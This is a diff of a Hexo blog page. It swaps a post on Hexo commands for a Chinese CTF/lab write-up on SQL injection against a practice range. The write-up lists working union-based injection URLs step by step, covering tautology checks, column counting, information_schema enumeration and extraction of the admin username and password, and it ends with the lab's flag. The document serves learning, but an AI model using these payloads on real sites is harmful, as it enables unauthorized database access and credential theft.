@@ -6,18 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>常用命令 | xyel的Hexo小站</title>
+  <title>Web安全防护指南04-SQL注入 | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="常用的Hexo 命令">
+  <meta name="description" content="Web安全防护指南04-SQL注入参考书籍：《Web安全防护指南》">
 <meta property="og:type" content="article">
-<meta property="og:title" content="常用命令">
-<meta property="og:url" content="http://example.com/2020/09/11/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:title" content="Web安全防护指南04-SQL注入">
+<meta property="og:url" content="http://example.com/2020/09/11/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="常用的Hexo 命令">
+<meta property="og:description" content="Web安全防护指南04-SQL注入参考书籍：《Web安全防护指南》">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-11T08:08:41.000Z">
-<meta property="article:modified_time" content="2020-09-11T11:28:06.703Z">
+<meta property="article:published_time" content="2020-09-11T14:43:01.000Z">
+<meta property="article:modified_time" content="2020-09-11T14:54:26.423Z">
 <meta property="article:author" content="xyel">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
   
   
@@ -138,37 +141,120 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-常用命令" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Web安全防护指南04-SQL注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      常用命令
+      Web安全防护指南04-SQL注入
     </h1>
   
 
         
-        <a href="/2020/09/11/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="archive-article-date">
-  	<time datetime="2020-09-11T08:08:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-11</time>
+        <a href="/2020/09/11/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2020-09-11T14:43:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="常用的Hexo-命令"><a href="#常用的Hexo-命令" class="headerlink" title="常用的Hexo 命令"></a>常用的Hexo 命令</h1><a id="more"></a>
+        <h1 id="Web安全防护指南04-SQL注入"><a href="#Web安全防护指南04-SQL注入" class="headerlink" title="Web安全防护指南04-SQL注入"></a>Web安全防护指南04-SQL注入</h1><p>参考书籍：《Web安全防护指南》</p>
+<a id="more"></a>
 
-<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><blockquote>
-<p>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p>
+<h2 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h2><p>恒真语句：and 1=1</p>
+<p>恒假语句：and 1=2</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1</p>
 </blockquote>
-<h2 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h2><blockquote>
-<p>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo g == hexo generate #生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy #部署</p>
+<p>回传正常</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2</p>
 </blockquote>
-<h2 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h2><blockquote>
-<p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</p>
+<p>回传不正常</p>
+<p>由此，我们可以判断网页有SQL注入漏洞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1&#39;">http://59.63.200.79:8003/?id=1&#39;</a></p>
 </blockquote>
+<p>同样这个语句回传不正常 </p>
+<p>同时这个语句可以绕过and字符串</p>
+<p>==%20表示空格  %27表示单引号==</p>
+<p>当and 或 ‘ 都无法生效时可以使用%27代替 ‘ </p>
+<h2 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h2><p>注入类型： 回显注入、盲注</p>
+<h2 id="4-3"><a href="#4-3" class="headerlink" title="4.3"></a>4.3</h2><p>==order by==</p>
+<p>判断数据表的列数</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> order by 3</p>
+</blockquote>
+<p>或</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1 order by 3</p>
+</blockquote>
+<p>回显成功  数据库大于等于3列</p>
+<p>回显失败  数据库小于3列</p>
+<p>== union select==</p>
+<p>判断回显位</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,2</p>
+</blockquote>
+<p>页面中出现2  表明2这个点可被控制输出</p>
+<p>== database()==</p>
+<p>查询当前数据库名</p>
+<p>==version()==</p>
+<p>查询版本</p>
+<p>在MySQL 5.0 后的版本中，内置了一个库<code>information_schema</code>存储当前库中所有库名，表名<br> <code>information_schema</code>可直接查询<code>information_schema</code>库来获得目标信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">information_schema&#123;</span><br><span class="line">	information_schema.tables&#123;</span><br><span class="line">		table_schema</span><br><span class="line">		table_name</span><br><span class="line">		&#125;</span><br><span class="line">	information_scheme.columns&#123;</span><br><span class="line">		table_name</span><br><span class="line">		column_name</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line">//画了半天没画出流程图emmmmmm</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</p>
+</blockquote>
+<p>from information_schema.tables where table_schema=database()在这里查询当前数据库表名</p>
+<p>limit 0,1 输出以下位置的值</p>
+<table>
+<thead>
+<tr>
+<th>0,0</th>
+<th>1,0</th>
+<th>2,0</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0,1</td>
+<td>1,1</td>
+<td>2,1</td>
+</tr>
+<tr>
+<td>0,2</td>
+<td>1,2</td>
+<td>2,2</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1  </p>
+<p>//输出内容为 id （在 0,1 上）</p>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 1,1</p>
+<p>//输出内容为 username （在 1,1 上）</p>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1</p>
+<p>//输出内容为 password （在 2,1 上）</p>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 3,1</p>
+<p>//没有输出内容</p>
+</blockquote>
+<p>得到字段后查询</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,username from admin  limit 0,1</p>
+<p>//得到username为admin</p>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,username from admin  limit 0,1</p>
+<p>//判断是否只有admin一个账户</p>
+</blockquote>
+<p>查询密码</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2 union select 1,password from admin  limit 0,1</p>
+<p>//得到admin密码</p>
+</blockquote>
+<p>靶场出处：<a target="_blank" rel="noopener" href="https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7">https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7</a></p>
+<p>flag：<code>hellohack</code></p>
 
       
 
@@ -177,6 +263,25 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -227,7 +332,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/09/11/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/09/11/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -241,15 +346,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/09/11/jatvisjCTF-Basic/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/09/11/jarvisojCTF-localhost/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          [jatvisjCTF]Basic
+          [jarvisojCTF]localhost
         
       </div>
     </a>
   
+  
+    <a href="/2020/09/11/jatvisjCTF-Basic/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">[jatvisjCTF]Basic</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -363,6 +473,22 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Basic</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
